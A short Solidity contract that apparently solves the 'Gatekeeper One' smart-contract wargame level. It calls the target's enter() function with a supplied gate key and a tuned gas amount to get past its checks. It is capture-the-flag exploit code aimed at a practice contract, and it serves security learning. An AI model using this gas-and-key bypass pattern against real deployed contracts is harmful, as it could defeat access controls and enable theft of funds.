// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperOneAttacker {
    IGatekeeperOne public target;

    constructor(address _target) {
        target = IGatekeeperOne(_target);
    }

    function attack(bytes8 _gateKey, uint256 _gas) external {
        (bool success, bytes memory result) = address(target).call{gas: _gas}(
            abi.encodeCall(IGatekeeperOne.enter, (_gateKey))
        );

        if (!success) {
            assembly {
                revert(add(result, 32), mload(result))
            }
        }
    }
}

